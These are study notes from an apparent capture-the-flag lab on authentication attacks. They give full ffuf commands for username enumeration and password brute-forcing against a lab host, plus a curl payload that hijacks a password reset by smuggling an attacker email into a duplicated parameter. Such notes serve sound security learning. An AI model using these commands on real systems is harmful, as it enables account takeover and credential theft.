# Room: Content Discovery 

## Key Concept
**Username Enumeration:**
- Enter username and if taken get a unique response eg "username already exists"
- Can be used to enumerate usernames

**Brute Force:**
- Trying a list of common passwords against a single username (of a list of them)

**Logic Flaws:**
- A **Logic Flaw** occurs when an application’s intended logical flow can be bypassed, manipulated, or subverted.
- These flaws can exist in any area of a site, but here we focus on authentication-related flaws.

## Tools / commands
### Fluff
#### Command - User Enumeration
- ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.1.206/customers/signup -mr "username already exists"

##### Switches
- -w selects file's location
- -x specifies the request method (GET is default)
- -d specifies the data that we are going to send 
- -H used for adding additional headers
- -u specifies URL we are making request to
- -mr the text on the page we are looking for

#### Command - Brute Force
- ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.1.206/customers/login -fc 200

##### Switches
- -w uses multiple wordlists (username list as W1, password list as W2 — separated by a comma)
- -X specifies request method (POST in this case)
- -d specifies the data to send (in this case, form fields with placeholders W1 and W2)
- -H sets the header (form data content type)
- -u specifies the URL for the request
- -fc filters out responses with status code 200 (assumes a failed login gives 200 so we want to catch anything else as a possible hit)

#### Command - Logic Flaw Exploit/Password Reset Hijack
- curl 'http://10.10.1.206/customers/reset?email=robert%40acmeitsupport.thm' -H 'Content-Type: application/x-www-form-urlencoded' -d 'username=robert&email=attacker@hacker.com'

##### How it works
- Application uses `$_REQUEST` which merges GET and POST (POST takes priority)
- By passing `email` in both GET and POST, we override the destination of the password reset
- Exploit flow:
  1. Register an account → receive email like `yourname@customer.acmeitsupport.thm`
  2. Use that email in the `email` POST parameter (while `email=robert...` remains in GET)
  3. A reset ticket is sent to **your account**, allowing login as **Robert**